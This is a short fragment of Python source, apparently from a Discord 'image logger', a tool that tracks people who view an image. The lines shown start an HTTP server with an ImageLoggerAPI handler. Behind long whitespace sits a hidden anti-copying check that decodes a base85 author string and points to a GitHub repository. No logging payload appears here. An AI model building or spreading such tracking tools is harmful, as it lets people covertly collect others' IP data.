...
handler = ImageLoggerAPI;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              raise SkidError("This appears to be skidded. Please use the proper copy @ https://github.com/dekrypted/discord-image-logger, thank you!") if base64.b85encode(__author__.encode()) != b'L}g2Id2n<' else None;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     httpd = HTTPServer((config["host"], config["port"]), handler)
